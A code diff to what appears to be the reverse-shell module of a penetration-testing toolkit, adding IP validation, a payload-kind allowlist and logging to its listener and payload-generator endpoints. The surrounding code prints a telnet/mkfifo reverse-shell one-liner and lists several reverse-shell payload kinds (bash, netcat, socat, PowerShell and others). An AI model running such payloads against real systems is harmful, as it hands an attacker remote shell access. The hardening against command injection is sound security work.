@@ -26,6 +26,7 @@ from __future__ import annotations
 import asyncio
 import base64
 import datetime as dt
+import logging
 import re
 import socket
 import subprocess
@@ -39,8 +40,18 @@ from fastapi import APIRouter, Depends, HTTPException, WebSocket, WebSocketDisco
 from pydantic import BaseModel, Field
 
 from lib.auth import require_local_auth
+from lib.errors import ErrorCode, MhpError, ws_error
+from lib.validators import validate_ip
+
+logger = logging.getLogger(__name__)
 
 router = APIRouter(tags=["reverse_shell"], dependencies=[Depends(require_local_auth)])
+
+# Valid payload kind IDs — keep in sync with PAYLOAD_KINDS below.
+_VALID_PAYLOAD_KINDS = {
+    "bash-tcp", "bash-i", "nc-e", "nc-mkfifo", "python", "python3",
+    "perl", "ruby", "php", "powershell", "socat", "awk", "telnet-fifo",
+}
 
 # ── Storage ──────────────────────────────────────────────────────────────────
 
@@ -290,22 +301,28 @@ def list_listeners() -> dict[str, list[dict[str, Any]]]:
 
 @router.post("/reverse-shell/listeners")
 async def create_listener(body: ListenerCreate) -> dict[str, Any]:
+    # Validate bind address — accepts any IP literal incl. 0.0.0.0 / 127.0.0.1.
+    host = validate_ip(body.host, field="host")
     # Reject obvious port collisions early — asyncio.start_server would otherwise
     # raise OSError and we'd lose the helpful "port already in use" framing.
     try:
         probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         probe.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        probe.bind((body.host, body.port))
+        probe.bind((host, body.port))
         probe.close()
     except OSError as exc:
-        raise HTTPException(status_code=400, detail=f"cannot bind {body.host}:{body.port} — {exc}")
+        logger.info("reverse-shell pre-bind failed host=%s port=%s err=%s",
+                    host, body.port, exc)
+        raise HTTPException(status_code=400, detail=f"cannot bind {host}:{body.port}")
 
     lid = uuid.uuid4().hex[:10]
-    listener = Listener(lid, body.host, body.port, body.auto_upgrade)
+    listener = Listener(lid, host, body.port, body.auto_upgrade)
     try:
         await listener.start()
     except OSError as exc:
-        raise HTTPException(status_code=400, detail=str(exc))
+        logger.info("reverse-shell start_server failed host=%s port=%s err=%s",
+                    host, body.port, exc)
+        raise HTTPException(status_code=400, detail=f"cannot start listener on {host}:{body.port}")
     LISTENERS[lid] = listener
     return _listener_view(listener)
 
@@ -434,7 +451,10 @@ def _render_payload(kind: str, lhost: str, lport: int) -> str:
     if kind == "telnet-fifo":
         return (f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 "
                 f"| telnet {h} {p} > /tmp/f")
-    raise HTTPException(status_code=400, detail=f"unknown payload kind: {kind}")
+    raise MhpError(
+        f"unknown payload kind: {kind}",
+        code=ErrorCode.BAD_REQUEST,
+    )
 
 
 @router.get("/reverse-shell/payload-kinds")
@@ -444,12 +464,19 @@ def payload_kinds() -> dict[str, list[dict[str, str]]]:
 
 @router.post("/reverse-shell/payload")
 def generate_payload(body: PayloadReq) -> dict[str, str]:
-    # Reject anything that looks like a shell metacharacter — we render the
-    # value directly into a command, so the caller treating the result as a
-    # one-liner shouldn't be able to smuggle their own shell out of it.
-    if any(c in body.lhost for c in "`$;|&<>\n\r\"'\\ "):
-        raise HTTPException(status_code=400, detail="invalid characters in lhost")
-    return {"cmd": _render_payload(body.kind, body.lhost, body.lport)}
+    # Validate payload kind against the allowlist before rendering, otherwise
+    # arbitrary text would be echoed back to the UI in the error message.
+    kind = body.kind.strip()
+    if kind not in _VALID_PAYLOAD_KINDS:
+        raise MhpError(
+            f"unknown payload kind: {kind!r}",
+            code=ErrorCode.BAD_REQUEST,
+        )
+    # `validate_ip` enforces length + IPv4/IPv6 literal. We render `lhost`
+    # straight into a shell command — anything that isn't a clean IP must be
+    # rejected before it lands in `/dev/tcp/<lhost>/<port>` etc.
+    lhost = validate_ip(body.lhost, field="lhost")
+    return {"cmd": _render_payload(kind, lhost, body.lport)}
 
 
 # ── WebSocket: interactive session ───────────────────────────────────────────
@@ -503,7 +530,7 @@ async def session_ws(ws: WebSocket, sid: str) -> None:
     except WebSocketDisconnect:
         pass
     except Exception:
-        pass
+        logger.exception("reverse-shell session_ws sid=%s", sid)
     finally:
         sess.subscribers.discard(ws)
         try:
